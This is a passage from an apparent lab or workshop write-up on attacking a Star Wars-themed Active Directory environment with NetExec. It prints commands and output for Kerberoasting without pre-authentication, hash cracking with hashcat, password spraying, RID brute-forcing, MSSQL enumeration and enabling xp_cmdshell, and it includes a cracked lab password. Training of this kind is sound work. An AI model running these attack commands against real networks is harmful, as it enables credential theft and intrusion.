</span></span><span style="display:flex;"><span>RDP         10.0.0.6        <span style="color:#ae81ff">3389</span>   MUSTAFAR         NLA Screenshot saved /root/.nxc/screenshots/MUSTAFAR_10.0.0.6_2025-06-28_211116.png
</span></span></code></pre></div><p><img src="_screenshots/Workshop-NetExec-NLA-screenshot.png" alt=""></p>
<p>From which we get 2 usernames:</p>
<p><img src="_screenshots/Workshop-NetExec-RDP-screenshot.png" alt=""></p>
<p>Let&rsquo;s create a file called in <code>users/real.txt</code> with our 2 known usernames:</p>
<pre tabindex="0"><code>grievousssssss
krennic
</code></pre><h2 id="as-rep-roasting--kerberoasting-without-pre-authentication">AS-REP Roasting &amp; Kerberoasting (without pre-authentication)</h2>
<p>A recent <a href="https://github.com/Pennyw0rth/NetExec/pull/756">PR</a> adding the <code>--no-preauth-targets</code> flag was merged and made me check this path out first.</p>
<p>We can check for common vulnerabilities on these accounts like <a href="https://www.thehacker.recipes/ad/movement/kerberos/kerberoast#kerberoast-w-o-pre-authentication">Kerberoasting (without pre-authentication)</a> and AS-REP Roasting since we have 2 valid usernames.</p>

  <div class="admonition note">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7 0 64 0L224 0l0 128c0 17.7 14.3 32 32 32l128 0 0 125.7-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3 0-64-28.7-64-64L0 64zm384 64l-128 0L256 0 384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9 0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6 0zM311.9 417L441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
      <span>Note</span>
    </div>
      <div class="admonition-content">
        <p>The <code>grievousssssss</code> account is vulnerable to AS-REP Roasting but the password does not crack with <code>rockyou.txt</code>.</p>
      </div>
  </div>
<p>What about Kerberoasting without pre-authentication? It works!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap targets.txt -u <span style="color:#e6db74">&#39;users/real.txt&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --no-preauth-targets users/real.txt --kerberoast                                                      
</span></span><span style="display:flex;"><span>ing kerberoasting                                                                                                                                                                                                  
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:CORUSCANT<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>                                        
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:JEDHA<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:Never<span style="color:#f92672">)</span>                                                  
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\g</span>rievousssssss account vulnerable to asreproast attack                                                                                        
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\g</span>rievousssssss: KDC_ERR_C_PRINCIPAL_UNKNOWN                                                                                                   
</span></span><span style="display:flex;"><span>LDAP        10.0.0.7        <span style="color:#ae81ff">389</span>    JEDHA            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> rebels.local<span style="color:#ae81ff">\k</span>rennic: KDC_ERR_C_PRINCIPAL_UNKNOWN                                                                                                          
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Total of records returned <span style="color:#ae81ff">1</span>                                                                                                                                
</span></span><span style="display:flex;"><span>LDAP        10.0.0.5        <span style="color:#ae81ff">389</span>    CORUSCANT        $krb5tgs$23*krennic$EMPIRE.LOCAL$krennic*$63ece4853bcd11f09a36146c1bc1ae7f$37c8e639506bd49f809cd1d4414e881f29b822d705f2954b5650a8481f920e4d1dfea2305193c92b2e47
</span></span><span style="display:flex;"><span>71c5b7cb7a539aeeaf9e1f534ae0ec1f0db1e801ccc78de4f91a953f7529ac121cb100ba735365f06afd5cb2e6e6c0f63679212e3aeed7014ee72d2fab3573febf901fc5d4fa06abae2468f3d691c5ea221626cdedfa693ea1da9603519f5dbc326d745dda32ca090a2
</span></span><span style="display:flex;"><span>3b3026cea81ff0172fa4996a552d4a916150d9dc15883fbe4ad37a33c07010416cbb105cab76429209ac521c6aad203dfc958eec4ff3df738f268c67bb68e38ef1659e1a33c70ab4931982df465e78ca7344fceb88bf2125fe4295b1a92700a6f97c2c3535cabee4dd5
</span></span><span style="display:flex;"><span>d406c60cabd1f825a91efb3e1f3e245fcdde6b415db6db8ec3e80297de4b7bc95500da9c3ada1cd7006c270176298a00f7b6ae6be6f370bd14f1cb9a46abef26d581a808ac2356708aadca9b5dc05c4dbde8b3d9c425845da6431dcf4caa492cbd89bd047683650f5cb
</span></span><span style="display:flex;"><span>7c9cf2b474cebe9652e31b98b7aa81a356b599aba236dc7ea114adef1850dc72c3c74f2c42efe3456f45b2dad6a2b9cd7bd7d2f269b1f960a72dd94062b9b7d53ff2112a09a692e7e2a888e56e475e926a868991cb8f5e11a48e1f4c108d94763409bb814eafc97403e
</span></span><span style="display:flex;"><span>f04bf55a6defa3b509f2ec43c17de5439e36fbb4d5574a4478f8193ff4e733170ebcdaf4f7cbf2c015894f64f6e571265313723c42f0b83b8fb75824e17593d11ad57fe85a32371e608f59d847e4b40301db0576db90590c793879ac6ef31c381e38c9edfe8dca1dd6c
</span></span><span style="display:flex;"><span>4805faa7d534a81d777a1a585f1648644c7b6ac1413703c536e6caf6864e6140a81b19f22287ea0c2b2877555c46baf7c79b549f25cf1e2f304c9cf39d965c6373e37175d8f43e2a0e9cfff1b1ca43c5704d8c25536b0ec57897d6af3c480f987cc4dde65673a235a7b
</span></span><span style="display:flex;"><span>2ab58b581aed1abfea95fffe25bbe9384816274a4c48c66dc16f596fe5c7e7142a75418d7d64e99a024634b56c271c3ffbe2f8941aa099baa55738ec0f90af389ed22f808980fba914bff5b34c677fecf48212ccb94321b2ec3f761c981df4a63e137f551670f6f84d7
</span></span><span style="display:flex;"><span>e9e9043b639c9b595b730fddf03649983c3ca9c6da17ec3af8c1bc4c31916cd8f1c2da90f2974368cbaa61bf8c32ca06d88b5c66861d23412f98dde9ee59ec98d6d99280463d1ffefc69e2c7813c506a2034598c974beb9b6c321092110a9e98e3b56bb57e63b8f13a6
</span></span><span style="display:flex;"><span>5daa32285294fb49fae3e51e3eb8837cceb0d433726a98f9ce02851add8bb403a7047a75c3a90ef347ee5e695e7c94c6a16b79b71d7d02e8ff5fd467e5e42528c65ece77dd5c95c8af2d6e75a0ee04914a48409e4eed3551588d9ba8c96f6cf3e73cb13964c24df7cd5
</span></span><span style="display:flex;"><span>cfc2aa2b17e78fbef21b822f63e21022a84411d3ed13eae2948d77ab506ac33133cb2fc5b4d8afb5b774a3fd6ff8c880bff3b4966aaa91975542ebd0c8873bc03bc07b687ae83ce39624cb5133a94a52e32b77647f320a50025b63db4d387c390e13dc9fae9be8a0d00
</span></span><span style="display:flex;"><span>17d1d35512594342c3d2ebe3834ffcb56a92
</span></span></code></pre></div>
  <div class="admonition tip">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M272 384c9.6-31.9 29.5-59.1 49.2-86.2c0 0 0 0 0 0c5.2-7.1 10.4-14.2 15.4-21.4c19.8-28.5 31.4-63 31.4-100.3C368 78.8 289.2 0 192 0S16 78.8 16 176c0 37.3 11.6 71.9 31.4 100.3c5 7.2 10.2 14.3 15.4 21.4c0 0 0 0 0 0c19.8 27.1 39.7 54.4 49.2 86.2l160 0zM192 512c44.2 0 80-35.8 80-80l0-16-160 0 0 16c0 44.2 35.8 80 80 80zM112 176c0 8.8-7.2 16-16 16s-16-7.2-16-16c0-61.9 50.1-112 112-112c8.8 0 16 7.2 16 16s-7.2 16-16 16c-44.2 0-80 35.8-80 80z"/></svg>
      <span>Check both vulnerabilities at once</span>
    </div>
      <div class="admonition-content">
        <p>We can check for Kerberoasting (without pre-authentication) and AS-REP Roasting in the same command.</p>
<p><code>nxc ldap targets.txt -u 'users/real.txt' -p '' --no-preauth-targets users/real.txt --kerberoasting kerberoasting --asreproast asreproast</code></p>
      </div>
  </div>
<p>We can attempt to crack it with <code>hashcat</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat --hash-type <span style="color:#ae81ff">13100</span> --attack-mode <span style="color:#ae81ff">0</span> kerberoasting  /opt/lists/rockyou.txt
</span></span></code></pre></div><p>This time it cracks and we get our first set of credentials!</p>
<h2 id="credentials----krennic">Credentials 🔑 - <code>krennic</code></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>krennic:liu8Sith
</span></span></code></pre></div><p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<hr>
<h2 id="domain-1---empirelocal">Domain 1 - <code>empire.local</code></h2>
<p>Now that we have valid credentials in the <code>empire.local</code> domain we can do several things:</p>
<ul>
<li>Dump LDAP information with <code>--bloodhound</code></li>
<li>Enumerate users with <code>--users</code> then spray our password on them</li>
<li>Try and authenticate over different protocols with our set of credentials</li>
<li>Enumerate SMB shares</li>
<li>Run NetExec SMB modules</li>
<li>etc.</li>
</ul>
<p>Let&rsquo;s start with BloodHound so that runs in the background:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap scope/dc.txt -u krennic -p liu8Sith -d empire.local --dns-server 10.0.0.5 --bloodhound -c all
</span></span></code></pre></div><p>Then move on to creating a list of usernames:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.0.0.6 -u <span style="color:#e6db74">&#39;krennic&#39;</span> -p <span style="color:#e6db74">&#39;liu8Sith&#39;</span> --users --log nxc/user-dump.txt
</span></span><span style="display:flex;"><span>awk <span style="color:#e6db74">&#39;{print $5}&#39;</span> nxc/user-dump.txt &gt; users/empire-all.txt
</span></span></code></pre></div><p>Password spraying yields nothing:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb targets.txt -u <span style="color:#e6db74">&#39;users/empire-all.txt&#39;</span> -p <span style="color:#e6db74">&#39;liu8Sith&#39;</span> --continue-on-success
</span></span></code></pre></div><p>Nor do we have any interesting shares to read a part from <code>IPC$</code> that allows us to RID brute force some more local usernames on <code>MUSTAFAR</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb targets.txt -u <span style="color:#e6db74">&#39;users/empire-all.txt&#39;</span> -p <span style="color:#e6db74">&#39;liu8Sith&#39;</span> --shares
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nxc smb 10.0.0.6 -u <span style="color:#e6db74">&#39;krennic&#39;</span> -p <span style="color:#e6db74">&#39;liu8Sith&#39;</span> --rid-brute
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith 
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         500: mustafar<span style="color:#ae81ff">\l</span>ocaladmin <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         501: mustafar<span style="color:#ae81ff">\G</span>uest <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         503: mustafar<span style="color:#ae81ff">\D</span>efaultAccount <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         504: mustafar<span style="color:#ae81ff">\W</span>DAGUtilityAccount <span style="color:#f92672">(</span>SidTypeUser<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         513: mustafar<span style="color:#ae81ff">\N</span>one <span style="color:#f92672">(</span>SidTypeGroup<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>SMB         10.0.0.6        <span style="color:#ae81ff">445</span>    MUSTAFAR         1000: mustafar<span style="color:#ae81ff">\S</span>QLServer2005SQLBrowserUser$MUSTAFAR <span style="color:#f92672">(</span>SidTypeAlias<span style="color:#f92672">)</span>
</span></span></code></pre></div>
  <div class="admonition note">
    <div class="admonition-header">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.7 28.7 0 64 0L224 0l0 128c0 17.7 14.3 32 32 32l128 0 0 125.7-86.8 86.8c-10.3 10.3-17.5 23.1-21 37.2l-18.7 74.9c-2.3 9.2-1.8 18.8 1.3 27.5L64 512c-35.3 0-64-28.7-64-64L0 64zm384 64l-128 0L256 0 384 128zM549.8 235.7l14.4 14.4c15.6 15.6 15.6 40.9 0 56.6l-29.4 29.4-71-71 29.4-29.4c15.6-15.6 40.9-15.6 56.6 0zM311.9 417L441.1 287.8l71 71L382.9 487.9c-4.1 4.1-9.2 7-14.9 8.4l-60.1 15c-5.5 1.4-11.2-.2-15.2-4.2s-5.6-9.7-4.2-15.2l15-60.1c1.4-5.6 4.3-10.8 8.4-14.9z"/></svg>
      <span>Note</span>
    </div>
      <div class="admonition-content">
        <p>I also tried several SMB modules like <code>gpp_autologin</code>, <code>gpp_password</code>, etc. but no luck there.</p>
      </div>
  </div>
<p>Let&rsquo;s try and connect with other protocols, starting by MSSQL since we saw that was open earlier:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql targets.txt -u krennic -p liu8Sith --continue-on-success             
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.8        <span style="color:#ae81ff">1433</span>   DANTOOINE        <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DANTOOINE<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:rebels.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith
</span></span></code></pre></div><p>We can successfully authenticate to the MSSQL server on <code>MUSTAFAR</code> (10.0.0.6) with our credentials.</p>
<h3 id="mssql-enumeration-on-mustafar">MSSQL enumeration on <code>MUSTAFAR</code></h3>
<p>We can run basic SQL queries with the <code>-q</code> flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith -q <span style="color:#e6db74">&#39;select @@version&#39;</span>      
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith 
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         Microsoft SQL Server <span style="color:#ae81ff">2022</span> <span style="color:#f92672">(</span>RTM<span style="color:#f92672">)</span> - 16.0.1000.6 <span style="color:#f92672">(</span>X64<span style="color:#f92672">)</span> 
</span></span><span style="display:flex;"><span>    Oct  <span style="color:#ae81ff">8</span> <span style="color:#ae81ff">2022</span> 05:58:25 
</span></span><span style="display:flex;"><span>    Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2022</span> Microsoft Corporation
</span></span><span style="display:flex;"><span>    Express Edition <span style="color:#f92672">(</span>64-bit<span style="color:#f92672">)</span> on Windows Server <span style="color:#ae81ff">2022</span> Datacenter Azure Edition 10.0 &lt;X64&gt; <span style="color:#f92672">(</span>Build 20348: <span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Hypervisor<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We can enumerate logins and see the <code>droideka</code> user:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith -M enum_logins               
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith 
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated logins
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         Login Name                          Type            Status
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         ----------                          ----            ------
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         EMPIRE<span style="color:#ae81ff">\k</span>rennic                      Domain User     ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         mustafar<span style="color:#ae81ff">\l</span>ocaladmin                 Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM                 Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         NT Service<span style="color:#ae81ff">\M</span>SSQL$SQLEXPRESS         Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         NT SERVICE<span style="color:#ae81ff">\S</span>QLTELEMETRY$SQLEXPRESS  Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         NT SERVICE<span style="color:#ae81ff">\S</span>QLWriter                Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         NT SERVICE<span style="color:#ae81ff">\W</span>inmgmt                  Local User      ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         droideka                            SQL User        ENABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         sa                                  SQL User        DISABLED
</span></span><span style="display:flex;"><span>ENUM_LOGINS 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         BUILTIN<span style="color:#ae81ff">\U</span>sers                       Windows Group   ENABLED
</span></span></code></pre></div><p>There are no linked servers&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith -M enum_links                
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith 
</span></span><span style="display:flex;"><span>ENUM_LINKS  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Linked servers found:
</span></span><span style="display:flex;"><span>ENUM_LINKS  10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>   - mustafar<span style="color:#ae81ff">\S</span>QLEXPRESS
</span></span></code></pre></div><p>We can try and enable <code>xp_cmdshell</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith -M enable_cmdshell -o ACTION<span style="color:#f92672">=</span>enable
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> empire.local<span style="color:#ae81ff">\k</span>rennic:liu8Sith
</span></span><span style="display:flex;"><span>ENABLE_C... 10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> xp_cmdshell successfully enabled.
</span></span></code></pre></div><p>NetExec says that the <code>xp_cmdshell</code> was successfully enabled but we can&rsquo;t actually execute any commands with <code>-x &lt;CMD&gt;</code> with our without <code>--local-auth</code> 🤔 (I&rsquo;ll have to look into the module&rsquo;s code to see what&rsquo;s going on):</p>
<p><img src="_screenshots/Workshop-NetExec-enable-xp_cmdshell.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc mssql 10.0.0.6 -u krennic -p liu8Sith --local-auth -x whoami                                                                                     
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:MUSTAFAR<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:empire.local<span style="color:#f92672">)</span>                                                                                      
</span></span><span style="display:flex;"><span>MSSQL       10.0.0.6        <span style="color:#ae81ff">1433</span>   MUSTAFAR         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> MUSTAFAR<span style="color:#ae81ff">\k</span>rennic:liu8Sith <span style="color:#f92672">(</span>Login failed <span style="color:#66d9ef">for</span> user <span style="color:#e6db74">&#39;krennic&#39;</span>. Please try again with or without <span style="color:#e6db74">&#39;--local-auth&#39;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>I ended up wasting almost an hour at this stage since I was convinced that it was the path 😔.</p>
<h3 id="bloodhound-analysis-">BloodHound Analysis 🐶</h3>
<p>Back to the BloodHound ingest that we did earlier we can see an interesting path for later on, <code>fn2187</code> can <code>ForceChangePassword</code> over <code>vader</code> who is a Domain Administrator in <code>empire.local</code>:</p>
<p><img src="_screenshots/Workshop-NetExec-BloodHound-vader-analysis.png" alt=""></p>
<h3 id="bad-successor">Bad Successor?</h3>
<p>Another recent module implemented by @mpgn is the <a href="https://github.com/Pennyw0rth/NetExec/pull/702">BadSuccessor module</a> based on this recent <a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory">blog post</a> by Akamai. Him and <a href="https://bsky.app/profile/cravaterouge.bsky.social">@CravateRouge</a> talk about the exploit more in detail in his latest <a href="https://open.spotify.com/episode/4aGJcFHrmabIxSBsEN7Zqt?si=6ba3a280b3d44c1a">podcast</a> if you&rsquo;re interested.</p>
<p>Even though we can&rsquo;t exploit it directly with NetExec I was curious to just try it out and enumerate dMSA objects:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc ldap 10.0.0.5 -u <span style="color:#e6db74">&#39;krennic&#39;</span> -p <span style="color:#e6db74">&#39;liu8Sith&#39;</span> -M badsuccessor
